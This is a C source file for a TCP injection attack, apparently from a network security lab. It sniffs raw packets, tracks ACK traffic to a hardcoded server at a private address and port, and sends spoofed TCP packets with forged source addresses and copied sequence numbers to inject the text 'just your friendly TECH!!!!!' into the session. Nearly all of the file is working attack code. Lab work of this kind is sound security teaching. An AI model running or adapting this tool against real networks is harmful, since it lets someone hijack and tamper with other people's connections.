//To run: gcc TCPInjection.c && sudo ./a.out


#include<netinet/in.h>
#include<errno.h>
#include<netdb.h>
#include<stdio.h>	//For standard things
#include<stdlib.h>	//malloc
#include<string.h>	//strlen

#include<netinet/ip_icmp.h>	//Provides declarations for icmp header
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include<netinet/if_ether.h>	//For ETH_P_ALL
#include<net/ethernet.h>	//For ether_header
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/time.h>
#include<sys/types.h>
#include<unistd.h>




void ProcessPacket(unsigned char* , int);
// void print_ip_header(unsigned char* , int);
int print_ip_header(unsigned char* , int);
void print_tcp_packet(unsigned char * , int );
void print_udp_packet(unsigned char * , int );
void print_icmp_packet(unsigned char* , int );
void PrintData (unsigned char* , int);

FILE *logfile;
struct sockaddr_in source,dest;
struct sockaddr_in sourceTrack,destTrack;
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
int PORT_OF_SERVER = 39841;
char* IP_OF_SERVER = "10.13.32.142";
int RUN_ATTACK_N_TIMES = 10;

//end TCP Injection attack#############################################################################################
//Data to be sent (appended at the end of the TCP header)
#define DATA "just your friendly TECH!!!!!"

//Debug function: dump 'index' bytes beginning at 'buffer'
void hexdump(unsigned char *buffer, unsigned long index) {
  unsigned long i;
  printf("hexdump on address %p:\n", buffer);
  for (i=0;i<index;i++)
  {
    printf("%02x ",buffer[i]);
  }
  printf("\n");
}

//Calculate the TCP header checksum of a string (as specified in rfc793)
//Function from http://www.binarytides.com/raw-sockets-c-code-on-linux/
unsigned short csum(unsigned short *ptr,int nbytes) {
  long sum;
  unsigned short oddbyte;
  short answer;
  sum=0;
  while(nbytes>1) {
    sum+=*ptr++;
    nbytes-=2;
  }
  if(nbytes==1) {
    oddbyte=0;
    *((u_char*)&oddbyte)=*(u_char*)ptr;
    sum+=oddbyte;
  }

  sum = (sum>>16)+(sum & 0xffff);
  sum = sum + (sum>>16);
  answer=(short)~sum;

  return(answer);
}


//Pseudo header needed for calculating the TCP header checksum
struct pseudoTCPPacket {
  uint32_t srcAddr;
  uint32_t dstAddr;
  uint8_t zero;
  uint8_t protocol;
  uint16_t TCP_len;
};


void sendSpfData(uint16_t sPort, uint16_t dPort, uint32_t sqNum, uint32_t ackNum)
{
  int sock, bytes, one = 1;
  struct iphdr *ipHdr;
  struct tcphdr *tcpHdr;

  uint32_t dstPort = ntohs(dPort); //39841;
  uint32_t srcPort = ntohs(sPort); //30001;
  uint32_t initSeqGuess = ntohl(sqNum);
  char *data;

  //Ethernet header + IP header + TCP header + data
  char packet[512];

  //Address struct to sendto()
  struct sockaddr_in addr_in;

  //Pseudo TCP header to calculate the TCP header's checksum
  struct pseudoTCPPacket pTCPPacket;

  //Pseudo TCP Header + TCP Header + data
  char *pseudo_packet;

  //Raw socket without any protocol-header inside
  if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("Error while creating socket");
    exit(-1);
  }

  //Set option IP_HDRINCL (headers are included in packet)
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
    perror("Error while setting socket options");
    exit(-1);
  }

  //Populate address struct
  addr_in.sin_family = AF_INET;
  addr_in.sin_port = htons(dstPort);

  // addr_in.sin_addr.s_addr = inet_addr(dstIP);
  addr_in.sin_addr.s_addr = inet_addr(inet_ntoa(destTrack.sin_addr));

  //Allocate mem for ip and tcp headers and zero the allocation
  memset(packet, 0, sizeof(packet));
  ipHdr = (struct iphdr *) packet;
  tcpHdr = (struct tcphdr *) (packet + sizeof(struct iphdr));
  data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
  strcpy(data, DATA);

  //Populate ipHdr
  ipHdr->ihl = 5; //5 x 32-bit words in the header
  ipHdr->version = 4; // ipv4
  ipHdr->tos = 0;// //tos = [0:5] DSCP + [5:7] Not used, low delay
  ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data); //total lenght of packet. len(data) = 0
  ipHdr->id = htons(54321); // 0x00; //16 bit id
  ipHdr->frag_off = 0x00; //16 bit field = [0:2] flags + [3:15] offset = 0x0
  ipHdr->ttl = 0xFF; //16 bit time to live (or maximal number of hops)
  ipHdr->protocol = IPPROTO_TCP; //TCP protocol
  ipHdr->check = 0; //16 bit checksum of IP header. Can't calculate at this point
  ipHdr->saddr = inet_addr(inet_ntoa(sourceTrack.sin_addr)); //32 bit format of source address
  ipHdr->daddr = inet_addr(inet_ntoa(destTrack.sin_addr)); //32 bit format of source address

  //Now we can calculate the check sum for the IP header check field
  ipHdr->check = csum((unsigned short *) packet, ipHdr->tot_len);

  //Populate tcpHdr
  tcpHdr->source = htons(srcPort); //16 bit in nbp format of source port
  tcpHdr->dest = htons(dstPort); //16 bit in nbp format of destination port
  tcpHdr->seq = (sqNum);//0x0; //32 bit sequence number, initially set to zero
  tcpHdr->ack_seq = (ackNum);//0x0; //32 bit ack sequence number, depends whether ACK is set or not
  tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
  tcpHdr->res1 = 0; //4 bits: Not used
  // tcpHdr->cwr = 0; //Congestion control mechanism
  // tcpHdr->ece = 0; //Congestion control mechanism
  tcpHdr->urg = 0; //Urgent flag
  tcpHdr->ack = 1; //Acknownledge
  tcpHdr->psh = 1; //Push data immediately
  tcpHdr->rst = 0; //RST flag
  tcpHdr->syn = 0; //SYN flag
  tcpHdr->fin = 0; //Terminates the connection
  tcpHdr->window = htons(155);//0xFFFF; //16 bit max number of databytes
  tcpHdr->check = 0; //16 bit check sum. Can't calculate at this point
  tcpHdr->urg_ptr = 0; //16 bit indicate the urgent data. Only if URG flag is set

  //Now we can calculate the checksum for the TCP header
  pTCPPacket.srcAddr = inet_addr(inet_ntoa(sourceTrack.sin_addr)); //32 bit format of source address
  pTCPPacket.dstAddr = inet_addr(inet_ntoa(destTrack.sin_addr)); //32 bit format of source address
  pTCPPacket.zero = 0; //8 bit always zero
  pTCPPacket.protocol = IPPROTO_TCP; //8 bit TCP protocol
  pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + strlen(data)); // 16 bit length of TCP header

  //Populate the pseudo packet
  pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(data)));
  memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(data));

  //Copy pseudo header
  memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));

  //Send lots of packets
  while(1)
  {
    //Try to gyess TCP seq
    tcpHdr->seq = htonl(initSeqGuess++);

    //Calculate check sum: zero current check, copy TCP header + data to pseudo TCP packet, update check
    tcpHdr->check = 0;

    //Copy tcp header + data to fake TCP header for checksum
    memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + strlen(data));

    //Set the TCP header's check field
    tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) +
          sizeof(struct tcphdr) +  strlen(data))));

    //Finally, send packet
    if((bytes = sendto(sock, packet, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0)
    {
      perror("Error on sendto()");
    }
    else
    {
      printf("Sent %d bytes.\n", bytes);
    }
    tcpHdr->source = htons(rand() %(65535+1-1024)+1024);

    //printf("SEQ guess: %u\n\n", initSeqGuess);
    break;
  }
}
//end TCP Injection attack#############################################################################################

int main()
{
	int saddr_size , data_size;
	struct sockaddr saddr;
	unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create log.txt file.");
	}
	printf("Starting...\n");

	int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;
	//setsockopt(sock_raw , SOL_SOCKET , SO_BINDTODEVICE , "eth0" , strlen("eth0")+ 1 );

	if(sock_raw < 0)
	{
		perror("Socket Error");
		return 1;
	}
	while(1)
	{
		saddr_size = sizeof saddr;
		//Receive a packet
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
		if(data_size <0 )
		{
			printf("Recvfrom error , failed to get packets\n");
			return 1;
		}
		//Now process the packet
		ProcessPacket(buffer , data_size);
	}
	close(sock_raw);
	printf("Finished");
	return 0;
}

void ProcessPacket(unsigned char* buffer, int size)
{
	//Get the IP Header part of this packet , excluding the ethernet header
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
		case 1:  //ICMP Protocol
			++icmp;
			print_icmp_packet( buffer , size);
			break;

		case 2:  //IGMP Protocol
			++igmp;
			break;

		case 6:  //TCP Protocol
			++tcp;
			print_tcp_packet(buffer , size);
			break;

		case 17: //UDP Protocol
			++udp;
			// print_udp_packet(buffer , size);
			break;

		default: //Some Other Protocol like ARP etc.
			++others;
			break;
	}
	//printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\r", tcp , udp , icmp , igmp , others , total);
}

void print_ethernet_header(unsigned char* Buffer, int Size)
{
	struct ethhdr *eth = (struct ethhdr *)Buffer;

	fprintf(logfile , "\n");
	fprintf(logfile , "Ethernet Header\n");
	fprintf(logfile , "   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
	fprintf(logfile , "   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
	fprintf(logfile , "   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
}

int print_ip_header(unsigned char* Buffer, int Size)
{
	// print_ethernet_header(Buffer , Size);
	unsigned short iphdrlen;
	struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
	iphdrlen =iph->ihl*4;
  memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;

	//for tracking server
	memset(&sourceTrack, 0, sizeof(sourceTrack));
	sourceTrack.sin_addr.s_addr = iph->daddr;

	memset(&destTrack, 0, sizeof(destTrack));
	destTrack.sin_addr.s_addr = iph->saddr;

	if(dest.sin_addr.s_addr == inet_addr(IP_OF_SERVER))
	{
		fprintf(logfile , "\n");
		fprintf(logfile , "IP Header [><talking to server]\n");
		fprintf(logfile , "   |-IP Version        : %d\n",(unsigned int)iph->version);
		fprintf(logfile , "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
		fprintf(logfile , "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
		fprintf(logfile , "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
		fprintf(logfile , "   |-Identification    : %d\n",ntohs(iph->id));
		//fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
		//fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
		//fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
		fprintf(logfile , "   |-TTL               : %d\n",(unsigned int)iph->ttl);
		fprintf(logfile , "   |-Protocol          : %d\n",(unsigned int)iph->protocol);
		fprintf(logfile , "   |-Checksum          : %d\n",ntohs(iph->check));
		fprintf(logfile , "   |-Source IP         : %s\n",inet_ntoa(source.sin_addr));
		fprintf(logfile , "   |-Destination IP    : %s\n",inet_ntoa(dest.sin_addr));

		//do TCP Injection attack
		return 1;
	}
  //don't do TCP Injection attack
	return 0;
}

void print_tcp_packet(unsigned char* Buffer, int Size)
{
	unsigned short iphdrlen;
	struct iphdr *iph = (struct iphdr *)( Buffer  + sizeof(struct ethhdr) );
	iphdrlen = iph->ihl*4;
	struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
	int header_size =  sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;

	if ((unsigned int)tcph->ack)
	{
		fprintf(logfile , "\n\n***********************TCP Packet*************************\n");
		fprintf(logfile , "\n");
		fprintf(logfile , "TCP Header\n");
		fprintf(logfile , "   |-Source Port      : %u\n",ntohs(tcph->source));
		fprintf(logfile , "   |-Destination Port : %u\n",ntohs(tcph->dest));
		fprintf(logfile , "   |-Sequence Number    : %u\n",ntohl(tcph->seq));
		fprintf(logfile , "   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
		fprintf(logfile , "   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
		//fprintf(logfile , "   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
		//fprintf(logfile , "   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
		fprintf(logfile , "   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
		fprintf(logfile , "   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
		fprintf(logfile , "   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
		fprintf(logfile , "   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
		fprintf(logfile , "   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
		fprintf(logfile , "   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
		fprintf(logfile , "   |-Window         : %d\n",ntohs(tcph->window));
		fprintf(logfile , "   |-Checksum       : %d\n",ntohs(tcph->check));
		fprintf(logfile , "   |-Urgent Pointer : %d\n",tcph->urg_ptr);
		fprintf(logfile , "\n");

		//send send spoofed data packet
		if(print_ip_header(Buffer,Size) && tcph->dest == ntohs(PORT_OF_SERVER))
		{
			sendSpfData(tcph->dest, tcph->source, tcph->ack_seq, tcph->seq);
		}
		fprintf(logfile , "\n###########################################################");
	}
}

void print_udp_packet(unsigned char *Buffer , int Size)
{
	unsigned short iphdrlen;
	struct iphdr *iph = (struct iphdr *)(Buffer +  sizeof(struct ethhdr));
	iphdrlen = iph->ihl*4;
	struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));
	int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;
	fprintf(logfile , "\n\n***********************UDP Packet*************************\n");
	print_ip_header(Buffer,Size);

	fprintf(logfile , "\nUDP Header\n");
	fprintf(logfile , "   |-Source Port      : %d\n" , ntohs(udph->source));
	fprintf(logfile , "   |-Destination Port : %d\n" , ntohs(udph->dest));
	fprintf(logfile , "   |-UDP Length       : %d\n" , ntohs(udph->len));
	fprintf(logfile , "   |-UDP Checksum     : %d\n" , ntohs(udph->check));
	fprintf(logfile , "\n");
	fprintf(logfile , "IP Header\n");
	PrintData(Buffer , iphdrlen);
	fprintf(logfile , "UDP Header\n");
	PrintData(Buffer+iphdrlen , sizeof udph);
	fprintf(logfile , "Data Payload\n");

	//Move the pointer ahead and reduce the size of string
	PrintData(Buffer + header_size , Size - header_size);
	fprintf(logfile , "\n###########################################################");
}

void print_icmp_packet(unsigned char* Buffer , int Size)
{
	unsigned short iphdrlen;
	struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr));
	iphdrlen = iph->ihl * 4;
	struct icmphdr *icmph = (struct icmphdr *)(Buffer + iphdrlen  + sizeof(struct ethhdr));
	int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof icmph;
	fprintf(logfile , "\n\n***********************ICMP Packet*************************\n");
	print_ip_header(Buffer , Size);
	fprintf(logfile , "\n");
	fprintf(logfile , "ICMP Header\n");
	fprintf(logfile , "   |-Type : %d",(unsigned int)(icmph->type));

	if((unsigned int)(icmph->type) == 11)
	{
		fprintf(logfile , "  (TTL Expired)\n");
	}
	else if((unsigned int)(icmph->type) == ICMP_ECHOREPLY)
	{
		fprintf(logfile , "  (ICMP Echo Reply)\n");
	}

	fprintf(logfile , "   |-Code : %d\n",(unsigned int)(icmph->code));
	fprintf(logfile , "   |-Checksum : %d\n",ntohs(icmph->checksum));
	//fprintf(logfile , "   |-ID       : %d\n",ntohs(icmph->id));
	//fprintf(logfile , "   |-Sequence : %d\n",ntohs(icmph->sequence));
	fprintf(logfile , "\n");
	fprintf(logfile , "IP Header\n");
	PrintData(Buffer,iphdrlen);
	fprintf(logfile , "UDP Header\n");
	PrintData(Buffer + iphdrlen , sizeof icmph);
	fprintf(logfile , "Data Payload\n");

	//Move the pointer ahead and reduce the size of string
	PrintData(Buffer + header_size , (Size - header_size) );
	fprintf(logfile , "\n###########################################################");
}

void PrintData (unsigned char* data , int Size)
{
	int i , j;
	for(i=0 ; i < Size ; i++)
	{
		if( i!=0 && i%16==0)   //if one line of hex printing is complete...
		{
			fprintf(logfile , "         ");
			for(j=i-16 ; j<i ; j++)
			{
				if(data[j]>=32 && data[j]<=128)
					fprintf(logfile , "%c",(unsigned char)data[j]); //if its a number or alphabet

				else fprintf(logfile , "."); //otherwise print a dot
			}
			fprintf(logfile , "\n");
		}

		if(i%16==0) fprintf(logfile , "   ");
			fprintf(logfile , " %02X",(unsigned int)data[i]);

		if( i==Size-1)  //print the last spaces
		{
			for(j=0;j<15-i%16;j++)
			{
			  fprintf(logfile , "   "); //extra spaces
			}
			fprintf(logfile , "         ");
			for(j=i-i%16 ; j<=i ; j++)
			{
				if(data[j]>=32 && data[j]<=128)
				{
				  fprintf(logfile , "%c",(unsigned char)data[j]);
				}
				else
				{
				  fprintf(logfile , ".");
				}
			}
			fprintf(logfile ,  "\n" );
		}
	}
}
